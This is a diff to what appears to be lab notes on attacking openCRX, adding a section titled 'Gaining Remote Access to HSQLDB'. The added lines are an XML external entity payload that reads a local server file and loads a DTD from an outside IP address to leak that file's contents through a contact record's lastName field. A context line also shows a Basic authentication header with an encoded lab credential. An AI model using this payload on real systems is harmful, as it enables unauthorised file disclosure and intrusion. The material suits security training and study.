@@ -264,3 +264,17 @@ Authorization: Basic Z3Vlc3Q6TmV3UGFzc3dvcmQhMTIzNA==
 </org.opencrx.kernel.account1.Contact>
 ```
 ### Gaining Remote Access to HSQLDB
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://192.168.45.176/wrapper.dtd" >
+%dtd;
+]>
+<org.opencrx.kernel.account1.Contact>
+  <lastName>&wrapper;</lastName>
+  <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
+```
